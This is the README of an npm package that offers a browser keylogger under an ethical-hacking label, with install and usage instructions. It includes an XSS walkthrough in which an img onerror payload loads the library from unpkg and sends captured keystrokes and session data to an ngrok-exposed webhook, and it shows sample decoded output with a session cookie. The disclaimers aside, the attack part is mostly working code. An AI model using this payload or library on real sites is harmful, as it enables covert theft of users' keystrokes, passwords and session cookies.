# Keylogger.js
**Keylogger.js** is a lightweight JavaScript library for ethical hacking, penetration testing, and security research. It allows security professionals to capture keyboard events and send them securely to a specified webhook for analysis. Designed for ethical use only, this library serves as a tool for demonstrating vulnerabilities in applications and enhancing system security.

## ⚠️ Disclaimer
This library is intended **only for ethical purposes** such as security research and testing within authorized environments. Unauthorized use, including any malicious or illegal intent, is strictly prohibited. The author disclaims all responsibility for any misuse of this software.

## Features
- **Lightweight**: keylogger.js is a lightweight library that can be easily integrated into any web application.
- **Secure**: All captured keyboard events are base64 encoded and sent securely to a specified webhook.
- **Customizable**: Developers can customize the library to suit their needs, including changing the webhook URL and adding additional functionality.
- **Modular**: Built using modern TypeScript for robust type safety and developer experience.

## Installation
You can install **Keylogger.js** via npm or yarn:

```bash
# Using bun
bun install @mihnea.dev/keylogger.js
# Using npm
npm install @mihnea.dev/keylogger.js
# Using yarn
yarn add @mihnea.dev/keylogger.js
```

## Usage
To use keylogger.js in your web application, you need to import the library and initialize it with your webhook URL:

```typescript
import Keylogger from '@mihnea.dev/keylogger.js';

/* Initialize the Keylogger with your webhook */
const _: Keylogger = new Keylogger('https://your-webhook-url.com');
```

Should you embed the script directly in your HTML file, you can initialize the library as follows:

```html
<script>
    import Keylogger from 'https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js';
    const keylogger = new Keylogger('https://your-webhook-url.com', false);
    console.log('Keylogger initialized:', keylogger);
</script>
```

## Configuration Options
Keylogger.js supports several configuration options that can be passed to the constructor:
- `webhook`: The URL to which the captured keyboard events will be sent.
- `logAll`: A boolean flag indicating whether all keyboard events should be logged (default: `false`).

## Example 
This example demonstrates how to use Keylogger.js in a controlled testing environment by integrating the Python server, exposing it using Ngrok, and embedding the library into a vulnerable webpage to simulate XSS.

### 1. Start the Python Webhook Server
The Python server included in [`./examples/server.py`](./examples/server.py) listens for incoming requests from Keylogger.js. It decodes Base64-encoded payloads and logs them. To start the server, run the following command:

```bash
python3 examples/server.py
```

### 2. Expose the Server Using Ngrok
To expose the Python server to the internet, use Ngrok. Run the following command to start an HTTP tunnel:

```bash
ngrok http 3000
```

### 3. Embed Keylogger.js in a Webpage
This step demonstrates embedding Keylogger.js into a vulnerable webpage as part of an XSS simulation.

```html
<img src="invalid.jpg" onerror="
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js';
    document.body.appendChild(script);
    script.onload = () => {
        const _ = new Keylogger('https://<random-id>.ngrok.io', false);
    };
">
```
![keylogger js](https://github.com/user-attachments/assets/716178d9-5a57-4bdd-9bc6-2788a705c05f)

### Observing Results:
1. The Keylogger.js library captures keystrokes and sends them to the webhook.
2. The Python server decodes the Base64-encoded payload and logs the captured keystrokes.
```bash
Decoded Payload: {"type":"enter","value":"a","session":{...}}
Parsed JSON:
{
    "type": "enter",
    "value": "asdf",
    "session": {
        "id": "unique-session-id",
        "created_at": "2024-11-29T18:00:00Z",
        "user_agent": "Mozilla/5.0",
        "session_cookie": "master-kw-session"
    }
}
```

## Security Considerations
- Ensure you use this library only in authorized and controlled environments.
- Do not use this tool for any illegal or unauthorized activity.
- Always notify and gain consent from stakeholders before testing.

## Contributing
Contributions are welcome! Feel free to open issues or submit pull requests to improve the library.

## License
This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more information.
